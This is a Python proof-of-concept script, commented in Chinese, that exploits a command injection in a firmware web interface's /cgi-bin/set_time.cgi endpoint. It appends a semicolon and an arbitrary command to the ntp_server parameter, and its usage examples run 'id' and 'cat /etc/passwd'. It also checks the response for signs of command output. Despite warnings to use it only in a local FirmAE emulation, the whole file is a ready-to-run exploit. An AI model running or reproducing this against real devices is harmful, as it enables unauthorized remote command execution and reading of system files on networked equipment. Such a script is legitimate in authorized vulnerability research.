#!/usr/bin/env python3
"""
命令注入 PoC —— 仅用于本地仿真环境验证

⚠️ 警告：请勿对任何未授权的真实设备使用此脚本。
         作者仅在本地的 FirmAE 仿真环境中验证过。

用法:
  python3 cmd_injection.py --target http://127.0.0.1 --cmd "id"
  python3 cmd_injection.py --target http://127.0.0.1 --check
"""
import argparse
import sys
import urllib.parse
import urllib.request
import urllib.error

VULN_PATH = '/cgi-bin/set_time.cgi'
PARAM = 'ntp_server'


def build_url(target, payload):
    """构造注入 URL"""
    query = urllib.parse.urlencode({PARAM: payload})
    return f'{target.rstrip("/")}{VULN_PATH}?{query}'


def send(url, timeout=10):
    """发送请求并返回响应体"""
    req = urllib.request.Request(url, headers={
        'User-Agent': 'Mozilla/5.0 (FirmwareAnalysis/1.0)'
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8', errors='ignore')
    except urllib.error.URLError as e:
        print(f'[!] 连接失败: {e.reason}')
        print('    请确认仿真环境已启动，且 target 地址正确')
        return None


def check(target):
    """先做连通性检查"""
    print(f'[*] 检查目标: {target}')
    body = send(f'{target.rstrip("/")}{VULN_PATH}?{PARAM}=127.0.0.1')
    if body is None:
        return False
    print(f'[*] 目标可达，响应长度 {len(body)} 字节')
    return True


def exploit(target, cmd):
    """执行注入"""
    # 注入点：ntp_server 参数被拼进 system("ntpdate <参数>")
    # 用分号截断原命令，追加自己的命令
    payload = f'127.0.0.1;{cmd}'

    print(f'[*] 注入 payload: {payload}')
    url = build_url(target, payload)
    print(f'[*] 请求 URL: {url}')
    print()

    body = send(url)
    if body is None:
        return

    print('[*] 响应内容:')
    print('-' * 60)
    print(body[:2000])
    print('-' * 60)

    # 简单判断注入是否成功
    indicators = ['uid=', 'gid=', 'root:', '/bin/sh', 'www-data']
    if any(ind in body for ind in indicators):
        print()
        print('[+] 疑似注入成功：响应中出现了命令执行的特征字符串')
        print('    请人工确认响应内容确实是命令输出，而非页面自带文本')
    else:
        print()
        print('[-] 未发现明显的命令执行特征')
        print('    可能原因：')
        print('      1. 参数过滤了特殊字符（分号、管道、反引号）')
        print('      2. 命令输出未回显到 HTTP 响应（盲注场景）')
        print('      3. 该固件版本已修复此问题')


def main():
    epilog_text = "\n".join([
        "示例:",
        "  python3 cmd_injection.py --target http://127.0.0.1 --check",
        '  python3 cmd_injection.py --target http://127.0.0.1 --cmd "id"',
        '  python3 cmd_injection.py --target http://127.0.0.1 --cmd "cat /etc/passwd"',
    ])
    parser = argparse.ArgumentParser(
        description='命令注入 PoC（仅限本地仿真环境）',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=epilog_text
    )
    parser.add_argument('--target', required=True, help='目标地址，如 http://127.0.0.1')
    parser.add_argument('--cmd', default='id', help='要执行的命令（默认 id）')
    parser.add_argument('--check', action='store_true', help='仅做连通性检查')

    args = parser.parse_args()

    print('=' * 60)
    print('  命令注入 PoC —— 仅限本地仿真环境')
    print('  请勿用于未授权的真实设备')
    print('=' * 60)
    print()

    if args.check:
        ok = check(args.target)
        sys.exit(0 if ok else 1)

    if not check(args.target):
        sys.exit(1)

    print()
    exploit(args.target, args.cmd)


if __name__ == '__main__':
    main()
